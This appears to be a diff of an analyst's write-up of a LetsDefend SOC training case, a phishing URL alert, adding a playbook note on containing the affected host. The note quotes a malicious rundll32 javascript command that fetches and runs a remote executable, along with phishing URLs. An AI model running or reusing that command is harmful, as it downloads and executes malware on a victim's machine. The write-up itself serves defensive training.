@@ -2,12 +2,6 @@ SOC141 - Phishing URL Detected
 see results at :
 https://app.letsdefend.io/case-management/casedetail/shakeco1/86
 
-|   |   |   |   |   |   |
-|---|---|---|---|---|---|
-|EventID :<br><br>86<br><br>Event Time :<br><br>Mar, 22, 2021, 09:23 PM<br><br>Rule :<br><br>SOC141 - Phishing URL Detected<br><br>Level :<br><br>Security Analyst<br><br>Source Address :<br><br>172.16.17.49<br><br>Source Hostname :<br><br>EmilyComp<br><br>Destination Address :<br><br>91.189.114.8<br><br>Destination Hostname :<br><br>mogagrocol.ru<br><br>Username :<br><br>ellie<br><br>Request URL :<br><br>http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io<br><br>User Agent :<br><br>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36<br><br>Device Action :<br><br>Allowed|   |   |   |   |   |
-
-
--------------------------------------------
 ### Collection Data
 
 Please check alert details fot belows.
@@ -78,3 +72,6 @@ we can see that only EmilyComp communicated with it.
 we have contained emily's computer
 untill further investigation 
 ![[Pasted image 20250809180645.png]]
+
+Playbook Note:
+on Mar, 22, 2021, 09:23 PM our SOC fired an alert of a suspected Phishing URL. our endpoint: Source Address : 172.16.17.49 Source Hostname : EmilyComp communicated with : Destination Address : 91.189.114.8 Destination Hostname : mogagrocol.ru Request URL : http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io after reviewing the endpoint it ran a script of the adress: rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')' the script called the following address: http://ru-uid-507352920.pp.ru/KBDYAK.exe therefore I containted the endpoint for further investigation.
